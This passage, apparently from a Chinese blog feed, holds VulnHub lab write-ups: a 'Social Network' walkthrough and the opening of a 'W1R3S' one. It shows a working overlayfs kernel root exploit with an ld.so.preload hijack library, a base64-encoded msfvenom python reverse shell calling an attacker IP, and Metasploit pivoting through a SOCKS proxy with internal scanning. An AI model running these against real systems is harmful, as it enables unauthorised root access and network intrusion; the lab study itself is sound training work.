(uid_t(*)(void)) dlsym((void *) -1, \&quot;getuid\&quot;);\nreadlink(\&quot;/proc/self/exe\&quot;, (char *) &amp;path, 128);\nif(geteuid() == 0 &amp;&amp; !strcmp(path, \&quot;/bin/su\&quot;)) &#123;\nunlink(\&quot;/etc/ld.so.preload\&quot;);unlink(\&quot;/tmp/ofs-lib.so\&quot;);\nsetresuid(0, 0, 0);\nsetresgid(0, 0, 0);\nexecle(\&quot;/bin/sh\&quot;, \&quot;sh\&quot;, \&quot;-i\&quot;, NULL, NULL);\n&#125;\n    return _real_getuid();\n&#125;\n&quot;</span></span><br><br>lib = open(<span class="hljs-string">&quot;/tmp/ofs-lib.c&quot;</span>,O_CREAT|O_WRONLY,<span class="hljs-number">0777</span>);<br>    write(lib,LIB,<span class="hljs-built_in">strlen</span>(LIB));<br>    close(lib);<br>    lib = system(<span class="hljs-string">&quot;gcc -fPIC -shared -o /tmp/ofs-lib.so /tmp/ofs-lib.c -ldl -w&quot;</span>);<br>    <span class="hljs-keyword">if</span>(lib != <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>,<span class="hljs-string">&quot;couldn&#x27;t create dynamic library\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br></code></pre></td></tr></table></figure><p>把 LIB 和编译部分的代码复制出来，写入文件 generate.c ，编译运行，生成 ofs-lib.so ，与 ofs 文件一同上传到靶机，赋权限执行即可。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash">include &lt;stdio.h&gt;</span><br><span class="hljs-meta">#</span><span class="bash">include &lt;stdlib.h&gt;</span><br><span class="hljs-meta">#</span><span class="bash">include &lt;unistd.h&gt;</span><br><span class="hljs-meta">#</span><span class="bash">include &lt;sched.h&gt;</span><br><span class="hljs-meta">#</span><span class="bash">include &lt;sys/stat.h&gt;</span><br><span class="hljs-meta">#</span><span class="bash">include &lt;sys/types.h&gt;</span><br><span class="hljs-meta">#</span><span class="bash">include &lt;sys/mount.h&gt;</span><br><span class="hljs-meta">#</span><span class="bash">include &lt;stdio.h&gt;</span><br><span class="hljs-meta">#</span><span class="bash">include &lt;stdlib.h&gt;</span><br><span class="hljs-meta">#</span><span class="bash">include &lt;unistd.h&gt;</span><br><span class="hljs-meta">#</span><span class="bash">include &lt;sched.h&gt;</span><br><span class="hljs-meta">#</span><span class="bash">include &lt;sys/stat.h&gt;</span><br><span class="hljs-meta">#</span><span class="bash">include &lt;sys/types.h&gt;</span><br><span class="hljs-meta">#</span><span class="bash">include &lt;sys/mount.h&gt;</span><br><span class="hljs-meta">#</span><span class="bash">include &lt;sys/types.h&gt;</span><br><span class="hljs-meta">#</span><span class="bash">include &lt;signal.h&gt;</span><br><span class="hljs-meta">#</span><span class="bash">include &lt;fcntl.h&gt;</span><br><span class="hljs-meta">#</span><span class="bash">include &lt;string.h&gt;</span><br><span class="hljs-meta">#</span><span class="bash">include &lt;linux/sched.h&gt;</span><br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash">define LIB <span class="hljs-string">&quot;#include &lt;unistd.h&gt;\n\nuid_t(*_real_getuid) (void);\nchar path[128];\n\nuid_t\ngetuid(void)\n&#123;\n_real_getuid = (uid_t(*)(void)) dlsym((void *) -1, \&quot;getuid\&quot;);\nreadlink(\&quot;/proc/self/exe\&quot;, (char *) &amp;path, 128);\nif(geteuid() == 0 &amp;&amp; !strcmp(path, \&quot;/bin/su\&quot;)) &#123;\nunlink(\&quot;/etc/ld.so.preload\&quot;);unlink(\&quot;/tmp/ofs-lib.so\&quot;);\nsetresuid(0, 0, 0);\nsetresgid(0, 0, 0);\nexecle(\&quot;/bin/sh\&quot;, \&quot;sh\&quot;, \&quot;-i\&quot;, NULL, NULL);\n&#125;\n    return _real_getuid();\n&#125;\n&quot;</span></span><br><br>int main()<br>&#123;<br>    int lib;<br>    lib = open(&quot;/tmp/ofs-lib.c&quot;,O_CREAT|O_WRONLY,0777);<br>    write(lib,LIB,strlen(LIB));<br>    close(lib);<br>    lib = system(&quot;gcc -fPIC -shared -o /tmp/ofs-lib.so /tmp/ofs-lib.c -ldl -w&quot;);<br>    if(lib != 0) &#123;<br>        fprintf(stderr,&quot;couldn&#x27;t create dynamic library\n&quot;);<br>        exit(-1);<br>    &#125;<br>    return 0;<br></code></pre></td></tr></table></figure><p>本地编译修改好的漏洞脚本：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> gcc 37292.c -o ofs</span>                                                                                                                   <br><span class="hljs-meta">$</span><span class="bash"> gcc generate.c -o ge</span>                                                                                       <br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> ./ge</span>                                              <br>                                                                                                             $ mv /tmp/ofs-lib.so ./                                                      <br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> python -m SimpleHTTPServer 8888</span><br>Serving HTTP on 0.0.0.0 port 8888 ...<br>192.168.135.151 - - [02/Jul/2022 00:45:07] &quot;GET /ofs HTTP/1.1&quot; 200 -<br>192.168.135.151 - - [02/Jul/2022 00:45:54] &quot;GET /ofs-lib.so HTTP/1.1&quot; 200 -<br></code></pre></td></tr></table></figure><p>靶机通过 wget 下载编译好的脚本及 ofs-lib.so 文件，运行即可拿到 root 权限。</p><blockquote><p>ofs-lib.so 文件需要放在 tmp 目录下，因为提权文件里写的路径是 /tmp，而且 tmp 是存放临时文件的，会消除我们上传的文件，有利于隐藏攻击 。</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs shell">john@socnet:~$ wget http://192.168.135.141:8888/ofs<br><br>john@socnet:~$ wget http://192.168.135.141:8888/ofs-lib.so<br><br>john@socnet:~$ ./ofs<br>-bash: ./ofs: Permission denied<br>john@socnet:~$ chmod +x ofs<br>john@socnet:~$ ./ofs<br>spawning threads<br>mount #1<br>mount #2<br>child threads done<br>/etc/ld.so.preload created<br>creating shared library<br>ERROR: ld.so: object &#x27;/tmp/ofs-lib.so&#x27; from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.<br>ERROR: ld.so: object &#x27;/tmp/ofs-lib.so&#x27; from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.<br>ERROR: ld.so: object &#x27;/tmp/ofs-lib.so&#x27; from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.<br>Password: <br>su: Authentication failure<br>john@socnet:~$ ls<br>ofs  ofs-lib.so<br>john@socnet:~$ mv ofs-lib.so /tmp<br>john@socnet:~$ ls<br>ofs<br>john@socnet:~$ ls /tmp<br>ofs-lib.so<br>john@socnet:~$ ./ofs<br>spawning threads<br>mount #1<br>mount #2<br>child threads done<br>/etc/ld.so.preload created<br>creating shared library<br><span class="hljs-meta">#</span><span class="bash"> whoami</span><br>root<br><span class="hljs-meta">#</span><span class="bash"> id</span><br>uid=0(root) gid=0(root) groups=0(root),1001(john)<br></code></pre></td></tr></table></figure><p>可以使用 SSH 拷贝文件：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> scp ./exp john@192.168.135.151:/tmp</span> <br><span class="hljs-meta">$</span><span class="bash"> scp /tmp/ofs-lib.so john@192.168.135.151:/tmp</span><br></code></pre></td></tr></table></figure><h2 id="四、总结"><a href="#四、总结" class="headerlink" title="四、总结"></a>四、总结</h2><ol><li>web 端口扫描、目录扫描</li><li>python 代码执行：反弹 shell</li><li>docker：内网渗透</li><li>内网渗透：主机发现、内网穿透、内网扫描、Elasticsearch漏洞</li><li>Hash 爆破：Hashcat</li><li>内核提权</li></ol><h2 id="五、MSF"><a href="#五、MSF" class="headerlink" title="五、MSF"></a>五、MSF</h2><blockquote><p><a href="https://www.anquanke.com/post/id/204066#h2-5">Vulnhub | Social Network 渗透靶机 - 安全客，安全资讯平台 (anquanke.com)</a></p></blockquote><h3 id="反弹-shell"><a href="#反弹-shell" class="headerlink" title="反弹 shell"></a>反弹 shell</h3><p>使用 <code>msfvenom</code> 生成 python 木马，反弹 shell：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> msfvenom -p python/meterpreter/reverse_tcp LHOST=192.168.135.141 LPORT=4444</span><br>[-] No platform was selected, choosing Msf::Module::Platform::Python from the payload<br>[-] No arch selected, selecting arch: python from the payload<br>No encoder specified, outputting raw payload<br>Payload size: 501 bytes<br>exec(__import__(&#x27;base64&#x27;).b64decode(__import__(&#x27;codecs&#x27;).getencoder(&#x27;utf-8&#x27;)(&#x27;aW1wb3J0IHNvY2tldCx6bGliLGJhc2U2NCxzdHJ1Y3QsdGltZQpmb3IgeCBpbiByYW5nZSgxMCk6Cgl0cnk6CgkJcz1zb2NrZXQuc29ja2V0KDIsc29ja2V0LlNPQ0tfU1RSRUFNKQoJCXMuY29ubmVjdCgoJzE5Mi4xNjguMTM1LjE0MScsNDQ0NCkpCgkJYnJlYWsKCWV4Y2VwdDoKCQl0aW1lLnNsZWVwKDUpCmw9c3RydWN0LnVucGFjaygnPkknLHMucmVjdig0KSlbMF0KZD1zLnJlY3YobCkKd2hpbGUgbGVuKGQpPGw6CglkKz1zLnJlY3YobC1sZW4oZCkpCmV4ZWMoemxpYi5kZWNvbXByZXNzKGJhc2U2NC5iNjRkZWNvZGUoZCkpLHsncyc6c30pCg==&#x27;)[0]))<br></code></pre></td></tr></table></figure><p>启动MSF，设置 Payload 监听，再把生成的木马放到 web 提交，成功反弹 shell：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> msfconsole</span><br><br>msf6 &gt; use exploit/multi/handler<br>[*] Using configured payload generic/shell_reverse_tcp<br>msf6 exploit(multi/handler) &gt; show options<br><br>Module options (exploit/multi/handler):<br><br>   Name  Current Setting  Required  Description<br>   ----  ---------------  --------  -----------<br><br><br>Payload options (generic/shell_reverse_tcp):<br><br>   Name   Current Setting  Required  Description<br>   ----   ---------------  --------  -----------<br>   LHOST                   yes       The listen address (an interface may be specified)<br>   LPORT  4444             yes       The listen port<br><br><br>Exploit target:<br><br>   Id  Name<br>   --  ----<br>   0   Wildcard Target<br><br><br>msf6 exploit(multi/handler) &gt; set LHOST 192.168.135.141<br>LHOST =&gt; 192.168.135.141<br>msf6 exploit(multi/handler) &gt; set payload python/meterpreter/reverse_tcp<br>payload =&gt; python/meterpreter/reverse_tcp<br>msf6 exploit(multi/handler) &gt; show options<br><br>Module options (exploit/multi/handler):<br><br>   Name  Current Setting  Required  Description<br>   ----  ---------------  --------  -----------<br><br><br>Payload options (python/meterpreter/reverse_tcp):<br><br>   Name   Current Setting  Required  Description<br>   ----   ---------------  --------  -----------<br>   LHOST  192.168.135.141  yes       The listen address (an interface may be specified)<br>   LPORT  4444             yes       The listen port<br><br><br>Exploit target:<br><br>   Id  Name<br>   --  ----<br>   0   Wildcard Target<br><br><br>msf6 exploit(multi/handler) &gt; run<br><br>[*] Started reverse TCP handler on 192.168.135.141:4444 <br><br>[*] Sending stage (39560 bytes) to 192.168.135.151<br>[*] Meterpreter session 1 opened (192.168.135.141:4444 -&gt; 192.168.135.151:53585) at 2022-07-01 10:38:01 -0400<br><br>meterpreter &gt; <br></code></pre></td></tr></table></figure><p>发现是个 docker ，难道要 docker 逃逸？回头看了看靶机作者的提示，有一个 pivoting 跳板攻击，应该是以这台机器当跳板 。</p><h3 id="自动路由"><a href="#自动路由" class="headerlink" title="自动路由"></a>自动路由</h3><p>接下来就是设置自动路由，扫描一下这个 docker 的局域网环境，先看看 docker1 的网络信息：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs shell">meterpreter &gt; ifconfig<br><br>Interface  1<br>============<br>Name         : lo<br>Hardware MAC : 00:00:00:00:00:00<br>MTU          : 65536<br>Flags        : UP LOOPBACK RUNNING<br>IPv4 Address : 127.0.0.1<br>IPv4 Netmask : 255.0.0.0<br><br>Interface  6<br>============<br>Name         : eth0<br>Hardware MAC : 02:42:ac:11:00:03<br>MTU          : 1500<br>Flags        : UP BROADCAST RUNNING MULTICAST<br>IPv4 Address : 172.17.0.2<br>IPv4 Netmask : 255.255.0.0<br></code></pre></td></tr></table></figure><p>然后使用 msf 的 autoroute 模块自动路由：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs shell">meterpreter &gt; run autoroute -s 172.17.0.0/16# 添加路由<br><br>[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.<br>[!] Example: run post/multi/manage/autoroute OPTION=value [...]<br>[*] Adding a route to 172.17.0.0/255.255.0.0...<br>[+] Added route to 172.17.0.0/255.255.0.0 via 192.168.135.151<br>[*] Use the -p option to list all active routes<br>meterpreter &gt; run autoroute -p# 查看路由<br><br>[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.<br>[!] Example: run post/multi/manage/autoroute OPTION=value [...]<br><br>Active Routing Table<br>====================<br><br>   Subnet             Netmask            Gateway<br>   ------             -------            -------<br>   172.17.0.0         255.255.0.0        Session 1<br><br>meterpreter &gt; <br></code></pre></td></tr></table></figure><p>对内网进行端口扫描：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs shell">meterpreter &gt; run auxiliary/scanner/portscan/tcp rhosts=172.17.0.0/24<br><br>[+] 172.17.0.1:           - 172.17.0.1:22 - TCP OPEN<br>[+] 172.17.0.1:           - 172.17.0.1:5000 - TCP OPEN<br>[+] 172.17.0.2:           - 172.17.0.2:5000 - TCP OPEN<br>[+] 172.17.0.3:           - 172.17.0.3:9200 - TCP OPEN<br>[+] 172.17.0.3:           - 172.17.0.3:9300 - TCP OPEN<br>[*] 172.17.0.0/24:        - Scanned  26 of 256 hosts (10% complete)<br>[*] 172.17.0.0/24:        - Scanned  52 of 256 hosts (20% complete)<br>[*] 172.17.0.0/24:        - Scanned  77 of 256 hosts (30% complete)<br>[*] 172.17.0.0/24:        - Scanned 103 of 256 hosts (40% complete)<br>[*] 172.17.0.0/24:        - Scanned 128 of 256 hosts (50% complete)<br>[*] 172.17.0.0/24:        - Scanned 154 of 256 hosts (60% complete)<br>[*] 172.17.0.0/24:        - Scanned 180 of 256 hosts (70% complete)<br>[*] 172.17.0.0/24:        - Scanned 205 of 256 hosts (80% complete)<br>[*] 172.17.0.0/24:        - Scanned 231 of 256 hosts (90% complete)<br>[*] 172.17.0.0/24:        - Scanned 256 of 256 hosts (100% complete)<br></code></pre></td></tr></table></figure><p>为了方便后续渗透，建立 socks 代理。</p><h3 id="msf-的代理模块-proxychains4"><a href="#msf-的代理模块-proxychains4" class="headerlink" title="msf 的代理模块 + proxychains4"></a>msf 的代理模块 + proxychains4</h3><p>让会话在后台运行：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs shell">meterpreter &gt; background# 让 meterpreter 会话在后台运行<br>[*] Backgrounding session 1...<br>msf6 exploit(multi/handler) &gt; sessions -l# 查看会话命令<br><br>Active sessions<br>===============<br><br>  Id  Name  Type                      Information          Connection<br>  --  ----  ----                      -----------          ----------<br>  1         meterpreter python/linux  root @ dbca22cf339d  192.168.135.141:4444 -&gt; 192.168.135.151:55647 (192.168.135.151)<br><br>msf6 exploit(multi/handler) &gt; sessions 1# 进入会话<br>[*] Starting interaction with 1...<br><br>meterpreter &gt; background<br>[*] Backgrounding session 1...<br>msf6 exploit(multi/handler) &gt; <br></code></pre></td></tr></table></figure><p>配置 socks 服务：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs shell">msf6 exploit(multi/handler) &gt; use auxiliary/server/socks_proxy<br>msf6 auxiliary(server/socks_proxy) &gt; show options<br><br>Module options (auxiliary/server/socks_proxy):<br><br>   Name      Current Setting  Required  Description<br>   ----      ---------------  --------  -----------<br>   PASSWORD                   no        Proxy password for SOCKS5 listener<br>   SRVHOST   0.0.0.0          yes       The address to listen on<br>   SRVPORT   1080             yes       The port to listen on<br>   USERNAME                   no        Proxy username for SOCKS5 listener<br>   VERSION   5                yes       The SOCKS version to use (Accepted: 4a, 5)<br><br><br>Auxiliary action:<br><br>   Name   Description<br>   ----   -----------<br>   Proxy  Run a SOCKS proxy server<br><br><br>msf6 auxiliary(server/socks_proxy) &gt; run<br>[*] Auxiliary module running as background job 0.<br>msf6 auxiliary(server/socks_proxy) &gt; <br>[*] Starting the SOCKS proxy server<br><br></code></pre></td></tr></table></figure><p>配置 proxychains4 配置文件：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> sudo vim /etc/proxychains4.conf</span><br><span class="hljs-meta">#</span><span class="bash"> socks5 127.0.0.1 1080</span><br></code></pre></td></tr></table></figure><p>接下来就可以使用 proxychains4 代理各种工具进入 docker 1 的 172.17 网段 。</p><h3 id="内网扫描-1"><a href="#内网扫描-1" class="headerlink" title="内网扫描"></a>内网扫描</h3><blockquote><p>至于如何扫描 172 网段的信息，可以将 nmap 上传到靶机，就在本地扫描，这样快稳很多，记得要添加 nmap 执行权限。</p></blockquote><p>在配置好代理之后，可以使用 kali 的代理工具 proxychains4 进行内网渗透 ：</p><blockquote><p>proxychains 不代理 UDP，ICMP，SYN 网络协议，无法进行系统探测，主机发现等等，但是可以用 <code>-sT</code> 参数并结合 <code>-Pn</code> 进行 TCP端口扫描  。</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> proxychains4 nmap -Pn -sT -sV -p9200,9300 172.17.0.3</span><br>Nmap scan report for 172.17.0.3 (172.17.0.3)<br>Host is up (0.057s latency).<br><br>PORT     STATE SERVICE  VERSION<br>9200/tcp open  wap-wsp?<br>9300/tcp open  vrace?<br>1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :<br>SF-Port9200-TCP:V=7.91%I=7%D=7/3%Time=62C170E3%P=x86_64-pc-linux-gnu%r(RTS<br>SF:PRequest,4F,&quot;HTTP/1\.1\x20200\x20OK\r\nContent-Type:\x20text/plain;\x20<br>SF:charset=UTF-8\r\nContent-Length:\x200\r\n\r\n&quot;)%r(SIPOptions,4F,&quot;HTTP/1<br>SF:\.1\x20200\x20OK\r\nContent-Type:\x20text/plain;\x20charset=UTF-8\r\nCo<br>SF:ntent-Length:\x200\r\n\r\n&quot;);<br><br>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap done: 1 IP address (1 host up) scanned in 122.26 seconds<br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> proxychains curl http://172.17.0.3:9200</span>             <br>[proxychains] config file found: /etc/proxychains4.conf<br>[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4<br>[proxychains] DLL init: proxychains-ng 4.14<br>[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.17.0.3:9200  ...  OK<br>&#123;<br>  &quot;status&quot; : 200,<br>  &quot;name&quot; : &quot;Baphomet&quot;,<br>  &quot;cluster_name&quot; : &quot;elasticsearch&quot;,<br>  &quot;version&quot; : &#123;<br>    &quot;number&quot; : &quot;1.4.2&quot;,<br>    &quot;build_hash&quot; : &quot;927caff6f05403e936c20bf4529f144f0c89fd8c&quot;,<br>    &quot;build_timestamp&quot; : &quot;2014-12-16T14:11:12Z&quot;,<br>    &quot;build_snapshot&quot; : false,<br>    &quot;lucene_version&quot; : &quot;4.10.2&quot;<br>  &#125;,<br>  &quot;tagline&quot; : &quot;You Know, for Search&quot;<br>&#125;<br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> proxychains curl http://172.17.0.3:9300</span><br>[proxychains] config file found: /etc/proxychains4.conf<br>[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4<br>[proxychains] DLL init: proxychains-ng 4.14<br>[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.17.0.3:9300  ...  OK<br>curl: (52) Empty reply from server<br></code></pre></td></tr></table></figure><p>开放 9200 和 9300 端口，通过搜索发现 9200 是 ElasticSearch 服务，是一个基于 Lucene 的搜索服务器，使用 Java 语言开发的 。</p>]]></content>
    
    
    <categories>
      
      <category>Penetration</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Penetration</tag>
      
      <tag>vulnhub</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>W1R3S交流</title>
    <link href="/2022/06/30/Penetration/Vulnhub/W1R3S%E4%BA%A4%E6%B5%81/"/>
    <url>/2022/06/30/Penetration/Vulnhub/W1R3S%E4%BA%A4%E6%B5%81/</url>
    
    <content type="html"><![CDATA[<h1 id="W1R3S交流"><a href="#W1R3S交流" class="headerlink" title="W1R3S交流"></a>W1R3S交流</h1><blockquote><p>靶机地址：<a href="https://www.vulnhub.com/entry/w1r3s-101,220/">W1R3S: 1.0.1 ~ VulnHub</a></p><p>环境信息：</p><ul><li>攻击机 IP：192.168.135.141</li><li>靶机 IP：192.168.135.145</li></ul></blockquote><h2 id="一、信息收集"><a href="#一、信息收集" class="headerlink" title="一、信息收集"></a>一、信息收集</h2><h3 id="1、主机探测"><a href="#1、主机探测" class="headerlink" title="1、主机探测"></a>1、主机探测</h3><p><strong>nmap 命令：</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> nmap -sn 192.168.135.0/24</span><br></code></pre></td></tr></table></figure><p><strong>得到靶机 ip：192.168.135.145</strong></p><h3 id="2、端口扫描"><a href="#2、端口扫描" class="headerlink" title="2、端口扫描"></a>2、端口扫描</h3><p><strong>nmap 命令：</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> sudo nmap -sS -A -p- 192.168.135.145</span><br></code></pre></td></tr></table></figure><p><strong>得到目标端口信息</strong></p><div class="table-container"><table><thead><tr><th>PORT</th><th>STATE</th><th>SERVICE</th><th>其他</th></tr></thead><tbody><tr><td>21/tcp</td><td>open</td><td>ftp</td><td>Anonymous FTP login allowed</td></tr><tr><td>22/tcp</td><td>open</td><td>ssh</td><td></td></tr><tr><td>80/tcp</td><td>open</td><td>http</td><td></td></tr><tr><td>3306/tcp</td><td>open</td><td>mysql</td></tr></tbody></table></div><h3 id="3、端口探测"><a href="#3、端口探测" class="headerlink" title="3、端口探测"></a>3、端口探测</h3><p><strong>21端口</strong></p><blockquote><p>FTP 的匿名登录一般有三种：</p><ul><li>用户名：anonymous；密码：Email或者为空</li><li>用户名：FTP；密码：FTP或者为空</li><li>用户名：USER；密码：pass</li></ul><p>ftp 命令参考：<a 